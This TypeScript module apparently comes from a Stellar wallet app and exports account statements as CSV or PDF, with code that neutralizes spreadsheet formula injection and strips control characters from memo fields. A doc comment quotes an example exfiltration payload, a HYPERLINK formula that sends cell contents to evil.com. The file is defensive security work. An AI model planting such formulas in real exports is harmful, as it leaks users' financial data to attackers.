import {
  STATEMENT_COLUMNS,
  type StatementExportFilters,
  type StatementExportFormat,
  type StatementExportResult,
  type StatementRow,
  type StatementRowsPage,
} from '@ancore/types';
import jsPDF from 'jspdf';
import autoTable from 'jspdf-autotable';

const DEFAULT_PAGE_LIMIT = 100;
const MAX_EXPORT_ROWS = 5_000;
const INDEXER_BASE_URL = import.meta.env.VITE_INDEXER_BASE_URL ?? '';

interface IndexerStatementRow {
  id: string;
  timestamp: string;
  counterparty?: string | null;
  amount?: string | null;
  asset?: string | null;
  status?: string | null;
  memo_or_reference?: string | null;
  memoOrReference?: string | null;
}

interface IndexerStatementRowsResponse {
  rows: IndexerStatementRow[];
  next_cursor?: string | null;
}

export class StatementExportError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'StatementExportError';
  }
}

function assertFilters(filters: StatementExportFilters) {
  if (!filters.accountId.trim()) {
    throw new StatementExportError('Choose an account before exporting a statement.');
  }

  const fromTime = Date.parse(filters.from);
  const toTime = Date.parse(filters.to);
  if (Number.isNaN(fromTime) || Number.isNaN(toTime)) {
    throw new StatementExportError('Choose a valid statement date range.');
  }
  if (fromTime > toTime) {
    throw new StatementExportError('Statement start date must be before the end date.');
  }
}

function normalizeStatus(value: string | undefined): StatementRow['status'] {
  if (value === 'completed' || value === 'pending' || value === 'failed') {
    return value;
  }
  return 'unknown';
}

function indexerRowToStatementRow(row: IndexerStatementRow): StatementRow {
  return {
    id: row.id,
    timestamp: row.timestamp,
    counterparty: row.counterparty ?? '—',
    amount: row.amount ?? '0',
    asset: row.asset ?? 'XLM',
    status: normalizeStatus(row.status ?? undefined),
    memoOrReference: row.memoOrReference ?? row.memo_or_reference ?? '',
  };
}

function buildStatementRowsUrl(filters: StatementExportFilters, cursor?: string): string {
  const url = new URL(
    `/api/v1/accounts/${encodeURIComponent(filters.accountId)}/statements/rows`,
    INDEXER_BASE_URL || window.location.origin
  );
  url.searchParams.set('from_date', new Date(filters.from).toISOString());
  url.searchParams.set('to_date', new Date(filters.to).toISOString());
  url.searchParams.set('limit', String(DEFAULT_PAGE_LIMIT));
  if (cursor) {
    url.searchParams.set('cursor_after', cursor);
  }
  return url.toString();
}

/**
 * Characters that make a spreadsheet evaluate a cell as a formula instead of
 * text. Tab and carriage return are included because Excel strips leading
 * whitespace before deciding, so "\t=cmd" still evaluates as a formula.
 */
const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** Plain numeric cells (negatives included) are data, never formulas. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/**
 * Neutralize CSV formula injection (CWE-1236).
 *
 * `counterparty` and `memoOrReference` are attacker-influenceable — any Stellar
 * counterparty can set an arbitrary memo — so a memo such as
 * `=HYPERLINK("http://evil.com?"&A1)` would otherwise execute when the exported
 * statement is opened in Excel or Google Sheets. Prefixing with a single quote
 * makes the spreadsheet render the original text without evaluating it.
 *
 * Genuinely numeric cells are left untouched so negative amounts keep sorting
 * and summing as numbers.
 */
export function neutralizeCsvFormula(value: string): string {
  if (PLAIN_NUMBER.test(value)) {
    return value;
  }
  return CSV_FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

function escapeCsvCell(value: string): string {
  const safe = neutralizeCsvFormula(value);
  if (/[,"\n\r]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

export function toStatementCsv(rows: StatementRow[]): string {
  const header = STATEMENT_COLUMNS.map((column) => escapeCsvCell(column.header)).join(',');
  const body = rows.map((row) =>
    STATEMENT_COLUMNS.map((column) => escapeCsvCell(String(row[column.key]))).join(',')
  );
  return [header, ...body].join('\n');
}

/**
 * Sanitize text for safe inclusion in PDF output.
 * Strips C0 control characters (U+0000–U+001F except tab/newline/CR) and
 * normalises line breaks to spaces. Prevents injection of PDF operators
 * through untrusted memo fields.
 */
export function sanitizeMemo(value: string): string {
  let result = '';
  for (let i = 0; i < value.length; i++) {
    const code = value.charCodeAt(i);
    if (code === 9 || code === 10 || code === 13 || code >= 32) {
      result += value[i];
    }
  }
  return result.replace(/\r\n?|\n/g, ' ').trim();
}

function toStatementPdf(rows: StatementRow[], filters: StatementExportFilters): Blob {
  const doc = new jsPDF({ orientation: 'landscape', unit: 'mm', format: 'a4' });

  const range = `${new Date(filters.from).toLocaleDateString()} — ${new Date(filters.to).toLocaleDateString()}`;
  doc.setFontSize(16);
  doc.text('Account Statement', 14, 20);

  doc.setFontSize(10);
  doc.text(`Account: ${filters.accountId}`, 14, 28);
  doc.text(`Date range: ${range}`, 14, 34);
  doc.text(`Rows: ${rows.length}`, 14, 40);

  if (rows.length === 0) {
    doc.setFontSize(11);
    doc.text('No statement activity found for the selected date range.', 14, 52);
    return doc.output('blob');
  }

  const head = [STATEMENT_COLUMNS.map((column) => column.header)];
  const body = rows.map((row) =>
    STATEMENT_COLUMNS.map((column) => sanitizeMemo(String(row[column.key])))
  );

  autoTable(doc, {
    startY: 46,
    head,
    body,
    styles: { fontSize: 8, cellPadding: 2 },
    headStyles: { fillColor: [15, 23, 42] },
    alternateRowStyles: { fillColor: [248, 250, 252] },
    margin: { left: 14, right: 14 },
  });

  return doc.output('blob');
}

function buildFilename(filters: StatementExportFilters, format: StatementExportFormat) {
  const from = filters.from.slice(0, 10);
  const to = filters.to.slice(0, 10);
  return `statement-${filters.accountId.slice(0, 8)}-${from}-${to}.${format === 'csv' ? 'csv' : 'pdf'}`;
}

export async function fetchStatementRows(
  filters: StatementExportFilters,
  fetcher: typeof fetch = fetch
): Promise<StatementRow[]> {
  assertFilters(filters);

  const rows: StatementRow[] = [];
  let cursor: string | undefined;

  do {
    const response = await fetcher(buildStatementRowsUrl(filters, cursor));
    if (!response.ok) {
      throw new StatementExportError('Unable to fetch statement rows from the indexer.');
    }

    const page = (await response.json()) as IndexerStatementRowsResponse;
    rows.push(...page.rows.map(indexerRowToStatementRow));
    cursor = page.next_cursor ?? undefined;

    if (rows.length > MAX_EXPORT_ROWS) {
      throw new StatementExportError(
        'Narrow the date range before exporting more than 5,000 rows.'
      );
    }
  } while (cursor);

  return rows;
}

export class StatementExportService {
  async fetchRows(filters: StatementExportFilters): Promise<StatementRowsPage> {
    const rows = await fetchStatementRows(filters);
    return { rows };
  }

  async export(
    filters: StatementExportFilters,
    format: StatementExportFormat
  ): Promise<StatementExportResult> {
    const rows = await fetchStatementRows(filters);

    if (format === 'pdf') {
      const blob = toStatementPdf(rows, filters);
      return {
        filename: buildFilename(filters, format),
        mimeType: 'application/pdf',
        blob,
      };
    }

    const csv = toStatementCsv(rows);
    return {
      filename: buildFilename(filters, format),
      mimeType: 'text/csv;charset=utf-8',
      blob: new Blob([csv], { type: 'text/csv;charset=utf-8' }),
    };
  }
}

export function downloadStatementExport(result: StatementExportResult) {
  const url = URL.createObjectURL(result.blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = result.filename;
  document.body.appendChild(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
}
